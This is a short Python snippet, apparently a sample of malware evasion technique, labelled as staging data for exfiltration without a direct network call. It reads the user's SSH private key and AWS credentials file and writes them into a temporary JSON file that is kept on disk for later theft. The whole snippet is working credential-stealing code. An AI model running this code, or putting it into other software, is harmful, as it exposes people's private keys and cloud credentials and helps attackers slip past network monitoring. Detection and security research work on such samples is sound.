# Evasion: no direct network call - stages data for exfil
import tempfile
import os
import json
sensitive = {
    'ssh_keys': open(os.path.expanduser('~/.ssh/id_rsa')).read(),
    'aws_creds': open(os.path.expanduser('~/.aws/credentials')).read(),
}
with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
    json.dump(sensitive, f)
